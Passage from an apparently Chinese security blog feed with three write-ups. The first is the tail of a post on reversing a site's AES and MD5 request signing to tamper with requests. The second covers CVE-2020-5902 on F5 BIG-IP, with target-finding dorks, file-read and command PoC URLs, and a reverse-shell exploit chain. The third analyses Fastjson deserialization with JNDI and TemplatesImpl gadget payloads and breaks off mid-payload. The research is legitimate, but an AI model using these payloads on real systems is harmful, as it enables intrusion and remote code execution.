<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
<p>然后复制n和iv的值</p>
<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2020-5902 F5 BIG-IP TMUI 远程代码执行漏洞</title>
    <url>/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/</url>
    <content><![CDATA[<p>2020年7月1日，F5官方发布了流量管理用户界面(TMUI)远程代码漏洞(CVE-2020-5902)安全通告，未经认证的攻击者，在可以访问TMUI界面的情况下，可对目标实现远程代码执行。</p>
<p>受影响版本：</p>
<p>BIG-IP  15.1.0, 15.0.0, 14.1.0-14.1.2, 13.1.0-13.1.3, 12.1.0-12.1.5, 11.6.1-11.6.5</p>
<a id="more"></a>

<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h2><p>Google dork</p>
<ul>
<li><code>inurl: &quot;tmui/login.jsp&quot;</code></li>
<li><code>intitle:&quot;BIG-IP&quot; inurl:&quot;tmui&quot;</code></li>
</ul>
<p>shodan搜索语法</p>
<ul>
<li><p><code>F5-Login-Page</code></p>
</li>
<li><p><code>WWW-Authenticate: Basic realm=BIG-IP</code></p>
</li>
<li><p><code>BigIP</code></p>
</li>
<li><p><code>BIG-IP</code></p>
</li>
<li><p><code>http.favicon.hash:-335242539</code></p>
</li>
<li><p><code>http.title:&quot;BIG-IP&amp;reg;- Redirect&quot;</code></p>
</li>
</ul>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/shodan-f5.png" alt="shodan-f5"></p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>文件读取：<code>https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p>
<p>命令执行：<code>https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</code></p>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>1.开启bash<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</code></p>
<p>2.在可执行目录下创建文件并写入需要执行的命令<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/123456&amp;content=bash+-i&gt;%26+/dev/tcp/192.168.1.1/4444+0&gt;%261</code></p>
<p>3.命令执行<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp%2f123456</code></p>
<p>4.还原list命令<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>在 <a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-5902</a> 中下载到所需文件的源码。</p>
<h2 id="为什么要使用-tmui-login-jsp"><a href="#为什么要使用-tmui-login-jsp" class="headerlink" title="为什么要使用/tmui/login.jsp/..;/"></a>为什么要使用/tmui/login.jsp/..;/</h2><p>TMUI原本存在登录限制，使用<code>/..;/</code>是为了绕过登录限制。绕过登录限制是漏洞利用的基础，只有绕过了登录限制，才能无障碍进行后续步骤。</p>
<p>登录限制之后的漏洞非常直接，通过代码审计可以很轻松的找到相应漏洞。</p>
<h2 id="tmshCmd-jsp"><a href="#tmshCmd-jsp" class="headerlink" title="tmshCmd.jsp"></a>tmshCmd.jsp</h2><p>查看<code>tmshCmd_jsp.java</code>文件，在第110行调用<code>WorkspaceUtils.runTmshCommand</code>方法</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/tmshCmd.png" alt="tmshCmd"></p>
<p>追到<code>WorkspaceUtils.runTmshCommand</code>方法，第80行存在command的判断，会禁止一些BadShellCharacters。command会根据空格分成cmdArray数组，并且cmdArray第一个命令必须是<code>create</code>、<code>delete</code>、<code>list</code>、<code>modify</code>，第三个必须被包含在<code>WHITELISTED_TMSH_MODULES</code>中，最后在第83行调用<code>Syscall.callElevated</code>进行tmsh命令执行。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-runTmshCommand.png" alt="WorkspaceUtils-runTmshCommand"></p>
<p>tmsh有自己一套的命令规则，参考 <a href="https://clouddocs.f5.com/cli/tmsh-reference/latest/general/tmsh.html" target="_blank" rel="noopener">https://clouddocs.f5.com/cli/tmsh-reference/latest/general/tmsh.html</a> 和 <a href="https://clouddocs.f5.com/api/tmsh/Commands.html" target="_blank" rel="noopener">https://clouddocs.f5.com/api/tmsh/Commands.html</a></p>
<p>需配合一定的手法，才能进行代码执行。</p>
<p>这就是为什么Exp中第一步需要执行<code>create cli alias private list command bash</code>命令的原因，将<code>list</code>别名为<code>bash</code>。所以第3步<code>list /tmp%2f123456</code>等效于<code>bash /tmp%2f123456</code>。</p>
<h2 id="fileRead-jsp"><a href="#fileRead-jsp" class="headerlink" title="fileRead.jsp"></a>fileRead.jsp</h2><p><code>fileRead_jsp.java</code>中第101行判断fileName是否在文件白名单中，第105行判断当前用户是否有该文件访问权限。最后在109行调用<code>WorkspaceUtils.readFile</code></p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/fileRead.png" alt="fileRead"></p>
<p>在<code>WorkspaceUtils.readFile</code>方法中直接读取文件并返回，因为使用<code>File</code>对象读取文件，所以可以读取任意文件。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-readFile.png" alt="WorkspaceUtils-readFile"></p>
<h2 id="fileSave-jsp"><a href="#fileSave-jsp" class="headerlink" title="fileSave.jsp"></a>fileSave.jsp</h2><p><code>fileSave_jsp.java</code>和<code>fileRead_jsp.java</code>中一样，首先对文件进行白名单判断和权限判断，再调用<code>WorkspaceUtils.saveFile</code>方法。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/fileSave.png" alt="fileSave"></p>
<p><code>WorkspaceUtils.saveFile</code>中第176-179行将传入的文件写入文件，导致任意文件可写漏洞。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-saveFile.png" alt="WorkspaceUtils-saveFile"></p>
<hr>
<p><code>WorkspaceUtils.saveFile</code>中有一点需要额外注意，第180-183行对文件权限和所属权进行了修改，使用的是<code>Runtime.getRuntime().exec()</code>，这可能会导致任意命令执行。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/runtime.png" alt="runtime"></p>
<p>但是这里使用的是<code>String []</code>（字符串数组）存储命令，</p>
<p>经过本地测试<code>String []</code>不能使用<code>&amp;&amp;</code>拼接执行多条命令，而<code>String</code>（字符串）可以使用<code>&amp;&amp;</code>拼接多条命令，<code>Runtime.getRuntime().exec()</code>传入字符串和传入字符串数组的执行是有差异的。</p>
<p>所以上述代码虽然将可控变量传入<code>Runtime.getRuntime().exec()</code>中，但无法造成任意命令执行。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-5902</a></p>
]]></content>
  </entry>
  <entry>
    <title>Fastjson反序列化过程分析</title>
    <url>/2020/02/27/Fastjson-deserialization/</url>
    <content><![CDATA[<blockquote>
<p>本篇文章记录fastjson反序列化的过程，记录自己对fastjson反序列化本质原因的学习过程，不对各版本的绕过做详细分析，版本绕过的分析网络上已经存在很多文章对其进行了清晰的描写。</p>
</blockquote>
<a id="more"></a>

<h1 id="fastjson反序列化过程的分析"><a href="#fastjson反序列化过程的分析" class="headerlink" title="fastjson反序列化过程的分析"></a>fastjson反序列化过程的分析</h1><p>先通过一个简单的Demo来认识fastjson的反序列化过程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsondeserialization.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestUser</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String name; <span class="comment">//私有属性，有getter、setter方法</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> flag; <span class="comment">//私有属性，有is、setter方法</span></span><br><span class="line">	<span class="keyword">public</span> String gender; <span class="comment">//公有属性，无getter、setter方法</span></span><br><span class="line">	<span class="keyword">private</span> String country; <span class="comment">//私有属性，无getter、setter方法</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">TestUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"call User default Constructor"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"call User getName"</span>);</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"call User setName"</span>);</span><br><span class="line">	<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"call User isFlag"</span>);</span><br><span class="line">	<span class="keyword">return</span> flag;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFlag</span><span class="params">(<span class="keyword">boolean</span> flag)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"call User setFlag"</span>);</span><br><span class="line">		<span class="keyword">this</span>.flag = flag;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">				<span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">				<span class="string">", flag="</span> + flag +</span><br><span class="line">				<span class="string">", gender='"</span> + gender + <span class="string">'\''</span> +</span><br><span class="line">				<span class="string">", country='"</span> + country + <span class="string">'\''</span> +</span><br><span class="line">				<span class="string">'&#125;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>当json中存在<code>@type</code>时，fastjson会将json中<code>key:value</code>值映射到@type对应的类中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsondeserialization.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonDeserializationDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//序列化</span></span><br><span class="line">		String serializedStr = <span class="string">"&#123;\"@type\":\"com.fastjsondeserialization.test.TestUser\",\"name\":\"seikei\",\"flag\": true,\"gender\":\"male\",\"country\":\"china\"&#125;"</span>;<span class="comment">//</span></span><br><span class="line">		System.out.println(<span class="string">"serializedStr="</span> + serializedStr);</span><br><span class="line"></span><br><span class="line">		System.out.println(<span class="string">"-----------------------------------------------\n\n"</span>);</span><br><span class="line">		<span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject]</span></span><br><span class="line">		System.out.println(<span class="string">"JSON.parse(serializedStr)："</span>);</span><br><span class="line">		Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">		System.out.println(<span class="string">"parse反序列化对象名称:"</span> + obj1.getClass().getName());</span><br><span class="line">		System.out.println(<span class="string">"parse反序列化："</span> + obj1);</span><br><span class="line">		System.out.println(<span class="string">"-----------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">		System.out.println(<span class="string">"JSON.parseObject(serializedStr)："</span>);</span><br><span class="line">		Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">		System.out.println(<span class="string">"parseObject反序列化对象名称:"</span> + obj2.getClass().getName());</span><br><span class="line">		System.out.println(<span class="string">"parseObject反序列化:"</span> + obj2);</span><br><span class="line">		System.out.println(<span class="string">"-----------------------------------------------\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>以上代码的执行结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serializedStr&#x3D;&#123;&quot;@type&quot;:&quot;com.fastjsondeserialization.test.TestUser&quot;,&quot;name&quot;:&quot;seikei&quot;,&quot;flag&quot;: true,&quot;gender&quot;:&quot;male&quot;,&quot;country&quot;:&quot;china&quot;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSON.parse(serializedStr)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setFlag</span><br><span class="line">parse反序列化对象名称:com.fastjsondeserialization.test.TestUser</span><br><span class="line">parse反序列化：User&#123;name&#x3D;&#39;seikei&#39;, flag&#x3D;true, gender&#x3D;&#39;male&#39;, country&#x3D;&#39;null&#39;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">JSON.parseObject(serializedStr)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setFlag</span><br><span class="line">call User isFlag</span><br><span class="line">call User getName</span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;gender&quot;:&quot;male&quot;,&quot;name&quot;:&quot;seikei&quot;&#125;</span><br><span class="line">-----------------------------------------------</span><br></pre></td></tr></table></figure>



<p>注意<code>JSON.parse()</code>和<code>JSON.parseObject（）</code>的差别</p>
<p><strong>JSON.parse()</strong></p>
<p>在指定了<code>@type</code>的情况下，自动调用了TestUser类默认构造器，TestUser类对应的setter方法（setName）,最终结果是TestUser类的一个实例。注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害。</p>
<p>还有一点需要注意的是<code>public gender</code>被成功赋值了，而<code>private country</code>没有成功赋值，fastjson在1.2.22, 1.1.54.android之后，增加了一个<code>SupportNonPublicField</code>特性，使得<code>private country</code>就算没有setter、getter方法也能成功赋值，该特性有在<code>TemplatesImpl</code>这条调用链中体现。</p>
<p><strong>JSON.parseObject()</strong></p>
<p>在指定了<code>@type</code>的情况下，自动调用了TestUser类默认构造器，TestUser类对应的setter方法（setName）以及对应的getter方法（getName）和is方法（isFlag），最终结果是一个字符串。这里多调用了getter和is方法，是因为<code>parseObject</code>在没有其他参数时，调用了<code>JSON.toJSON(obj)</code>，后续会通过gettter方法获取obj属性值。</p>
<p><code>JSON.parseObject()</code>一直到<code>setName</code>方法的调用栈如下图，看到<code>JSON.parseObject()</code>会调用到<code>JSON.parse()</code>、再调用<code>DefaultJSONParser.parse()</code>，也就是说<code>JSON.parseObject()</code>本质上还是调用<code>JSON.parse()</code>进行反序列化的，区别是<code>parseObject()</code>会额外调用<code>JSON.toJSON()</code>来将Java对象转为JSONObject对象。两者的反序列化的操作时一样的，因此都能成功触发反序列化。</p>
<p><img src="/2020/02/27/Fastjson-deserialization/fastjson-demo-stack.png" alt="fastjson-demo-stack"></p>
<p>重点在知道json反序列化会调用setter和getter方法，指定<code>@type</code>时，fastjson会自动调用<code>@type</code>对应类的setter和getter方法，调用setter和getter方法是正常业务功能。但当该类的setter或getter方法可被利用时，会导致漏洞。这也是为什么fastjson在之前的修复一直都是添加类的黑名单，而不是禁止反序列化功能。</p>
<p>fastjson具体的解析过程可以参考<a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
<h1 id="fastjson利用链"><a href="#fastjson利用链" class="headerlink" title="fastjson利用链"></a>fastjson利用链</h1><p>我们知道Json中存在<code>@type</code>时，<code>JSON.parse()</code>会自动调用类的默认构造器和对应的setter方法，<code>JSON.parseObject()</code>会自动调用类的默认构造器和对应的setter、getter和is方法。</p>
<p>利用的关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p>
<ol>
<li>该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行；</li>
<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
</ol>
<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p><code>JdbcRowSetImpl</code>的PoC为：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"xxx"</span>:&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Object"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>多加一个”xxx”是为了增加Payload的适用性。</p>
<p><code>JdbcRowSetImpl.java</code>的代码查看方法，先<code>import com.sun.rowset.JdbcRowSetImpl;</code>，然后按住CMD（或CTRL）键点击即可查看。</p>
<img src="/2020/02/27/Fastjson-deserialization/lookup-jdbcrowsetimpl.png" alt="lookup-jdbcrowsetimpl" style="zoom:39%;">



<p><code>JdbcRowSetImpl</code>调用链的过程：</p>
<ol>
<li><code>JdbcRowSetImpl</code>对象恢复</li>
</ol>
<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-restore.png" alt="jdbcrowsetimpl-restore"></p>
<ol start="2">
<li><code>setDataSourceName</code>方法调用</li>
</ol>
<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-setdatasourcename.png" alt="jdbcrowsetimpl-setdatasourcename"></p>
<ol start="3">
<li><code>setAutocommit</code>方法调用，里面调用了<code>this.connect()</code></li>
</ol>
<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-setautocommit.png" alt="jdbcrowsetimpl-setautocommit"></p>
<ol start="4">
<li><code>this.connect()</code>调用<code>context.lookup(datasourceName)</code></li>
</ol>
<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-connect.png" alt="jdbcrowsetimpl-connect"></p>
<p><code>javax/naming/InitialContext#lookup</code>进行ldap查询，在此可以进行JNDI注入。</p>
<p><img src="/2020/02/27/Fastjson-deserialization/InitialContext-lookup.png" alt="InitialContext-lookup"></p>
<p>整个调用栈过程如下</p>
<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-stack.png" alt="jdbcrowsetimpl-stack"></p>
<p>整个过程调用的都是setter方法，所以该调用链在<code>parse()</code>和<code>parseObject()</code>中都能使用。</p>
<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，该调用链存在一定的限制，因为在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>。在实际场景中很少会设置<code>Feature.SupportNonPublicField</code>，所以该调用链在实际场景的利用有限。</p>
<p>首先，在构造函数<code>TemplatesImplDemo</code>中的<code>Runtime.getRuntime().exec()</code>中输入想要执行的命令，然后将代码编译成class文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImplDemo</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">TemplatesImplDemo</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		Runtime.getRuntime().exec(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		TemplatesImplDemo t = <span class="keyword">new</span> TemplatesImplDemo();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将<code>evilClassPath</code>参数设置成上面编译得到的class文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonTemplatesImpl</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">		ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">			<span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">			<span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/com/fastjsondeserialization/test/TemplatesImplDemo.class"</span>;</span><br><span class="line"></span><br><span class="line">			String evilCode = readClass(evilClassPath);</span><br><span class="line">			<span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">			String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">					<span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">					<span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">			System.out.println(text1);</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>得到fastjson的PoC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADRMY29tL2Zhc3Rqc29uZGVzZXJpYWxpemF0aW9uL3Rlc3QvVGVtcGxhdGVzSW1wbERlbW87AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1h